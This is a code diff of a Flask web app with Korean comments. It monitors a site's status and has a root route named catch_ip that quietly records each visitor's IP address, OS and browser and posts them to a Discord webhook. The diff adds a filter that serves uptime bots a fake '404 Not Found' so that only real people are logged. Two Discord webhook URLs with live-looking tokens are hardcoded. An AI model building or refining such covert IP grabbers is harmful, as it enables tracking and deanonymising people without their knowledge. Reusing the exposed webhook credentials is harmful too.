@@ -10,7 +10,7 @@ app = Flask(__name__)
 
 # 설정
 DISCORD_WEBHOOK_URL_STATUS = "https://discord.com/api/webhooks/1547891715279687763/jGm9yeR8j_k5kOHFS-Knmt57n8bm8vTSTiiAVJAlmywH0HsSEeCjNL-2XRkOqHrU6flW" # 포타슘 상태 알림용
-DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3rQMtk8DOXHI2OjmBCaCNbv54yJm9u27t0GLbfhJQ-2oL7SAZVGQ_NhXzQ1D2yzzB89n"     # IP 로깅용
+DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3rQMtk8DOXHI2OjmBCaCNbv54yJm9u27t0GLbfhJQ-2oL7SAZVGQ_NhXzQ1D2yzzB89n"     # 접속 정보 로깅용
 
 TARGET_URL = "https://weao.xyz"
 last_status = None
@@ -47,7 +47,7 @@ def monitor_potassium():
             
         time.sleep(60)
 
-# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (메인 주소 접속 시 작동)
+# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 적용)
 @app.route('/')
 def catch_ip():
     if request.headers.get('X-Forwarded-For'):
@@ -95,8 +95,12 @@ def catch_ip():
     elif "Safari/" in user_agent and "Chrome/" not in user_agent:
         browser_info = "Safari"
 
-    # 렌더 서버 환경이므로 로컬 텍스트 파일 저장 대신 콘솔 출력으로 대체
-    print(f"[!] 접속 로그 감지 -> IP: {user_ip} | OS: {os_info} | Browser: {browser_info}")
+    # UptimeRobot 같은 핑 봇은 '기타 OS'와 '기타 브라우저'로 잡히므로 웹훅을 쏘지 않고 차단함
+    if os_info == "기타 OS" and browser_info == "기타 브라우저":
+        print(f"[!] 핑 봇 접속 차단됨 (IP: {user_ip})")
+        return "404 Not Found"
+
+    print(f"[!] 실제 접속 감지 -> IP: {user_ip} | OS: {os_info} | Browser: {browser_info}")
         
     discord_payload = {
         "content": "서버 접속 알림",
